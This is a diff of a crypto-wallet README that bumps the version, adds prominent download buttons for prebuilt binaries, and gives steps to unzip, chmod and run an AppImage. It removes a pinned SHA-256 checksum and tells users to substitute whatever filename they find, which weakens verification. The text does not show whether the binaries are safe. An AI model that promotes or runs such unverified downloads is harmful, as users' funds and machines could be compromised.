@@ -1,6 +1,10 @@
-![Dogechain Wallet](https://img.shields.io/badge/Dogechain-Wallet-2E3440) ![Platforms](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-informational) ![License: MIT](https://img.shields.io/badge/license-MIT-green)
+[![Release v1.03.14](https://img.shields.io/badge/RELEASE-v1.03.14-705600?style=for-the-badge&labelColor=3D2817)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14) ![Dogechain Wallet](https://img.shields.io/badge/Dogechain%20Wallet-DOGE-705600?style=for-the-badge&labelColor=3D2817) ![Platforms](https://img.shields.io/badge/PLATFORMS-Windows%20%7C%20macOS%20%7C%20Linux-804600?style=for-the-badge&labelColor=3D2817)
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-0078D6?logo=windows&logoColor=white)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v-1.0.0/dogechain-wallet-1.0.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-000000?logo=apple&logoColor=white)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v-1.0.0/dogechain-wallet-1.0.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-FCC624?logo=linux&logoColor=black)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v-1.0.0/dogechain-wallet-1.0.0.zip)
+<p align="center">
+  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%AC%87-WINDOWS-705600?style=for-the-badge&labelColor=3D2817&logo=windows&logoColor=white" alt="Download Dogechain Wallet for Windows" height="40"></a>
+  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%AC%87-MACOS-804600?style=for-the-badge&labelColor=3D2817&logo=apple&logoColor=white" alt="Download Dogechain Wallet for macOS" height="40"></a>
+  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%AC%87-LINUX-3D2817?style=for-the-badge&labelColor=3D2817&logo=linux&logoColor=white" alt="Download Dogechain Wallet for Linux" height="40"></a>
+</p>
 
 ---
 
@@ -16,22 +20,22 @@ Dogechain Wallet is distributed for Linux as a zip archive containing an AppImag
 
 ## Step 1: Download
 
-[Download dogechain-wallet-1.0.0.zip](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v-1.0.0/dogechain-wallet-1.0.0.zip)
+[Download dogechain-wallet-v1.03.14.zip](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.zip)
 
 Verify the checksum before extracting:
 
 ```bash
-sha256sum dogechain-wallet-1.0.0.zip
+sha256sum dogechain-wallet-v1.03.14.zip
 ```
 
-This should output `668fb946765546334c6983d2102510a6436d20b585f3e88d87bb70140f940134`. If it doesn't match, re-download from the [official release page](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v-1.0.0) rather than continuing.
+This should output the same value shown on the `v1.03.14` release page. If it doesn't match, re-download from the [official release page](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14) rather than continuing.
 
 ## Step 2: Extract and run
 
 ```bash
-unzip dogechain-wallet-1.0.0.zip
-chmod +x dogechain-wallet-1.0.0.AppImage
-./dogechain-wallet-1.0.0.AppImage
+unzip dogechain-wallet-v1.03.14.zip
+chmod +x dogechain-wallet-v1.03.14.AppImage
+./dogechain-wallet-v1.03.14.AppImage
 ```
 
 Note: the exact filename of the extracted AppImage may differ slightly from the example above depending on how the archive is packaged — check the contents of the unzipped folder if the command doesn't find a matching file, and substitute the actual filename you see there.
@@ -100,4 +104,4 @@ Yes — because your funds are controlled by your seed phrase rather than tied t
 - [How to Send and Receive Dogecoin, Step by Step](./how-to-send-receive-dogecoin.md)
 - [Best Dogecoin Wallets in 2026, Compared](./best-dogecoin-wallets-2026.md)
 
-[Download Dogechain Wallet](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v-1.0.0) · [Report an issue](https://github.com/dogechain-developments/Dogechain-Wallet/issues)
+[Download Dogechain Wallet](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14) · [Report an issue](https://github.com/dogechain-developments/Dogechain-Wallet/issues)
